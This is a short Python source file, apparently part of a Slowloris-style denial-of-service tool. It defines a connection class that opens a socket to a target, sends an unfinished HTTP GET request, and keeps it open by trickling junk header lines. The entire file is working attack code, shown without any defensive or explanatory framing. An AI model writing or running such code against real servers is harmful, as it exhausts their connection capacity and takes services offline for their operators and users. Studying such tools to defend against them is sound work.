import random
import socket

class LorisConnection:
    def __init__ (self, ip, port):
        self.ip = ip
        self.port = port
        
        self.socket = socket.socket (socket.AF_INET, socket.SOCK_STREAM)
        self.socket.connect ((self.ip, self.port))
        # TODO: Add SSL support

    def close (self):
        self.socket.close ()    

    def sendheaders (self, uagent):
        self.socket.send ("GET /?%s HTTP/1.1\r\n" % (random.randrange (0, 2000)))
        self.socket.send ("%s\r\n" % (uagent))
        self.socket.send ("Accept-language: en-US,en,q=0.5\r\n")
        
    def keepalive (self):
        self.socket.send ("X-a: %s\r\n" % (random.randrange (1, 5000)))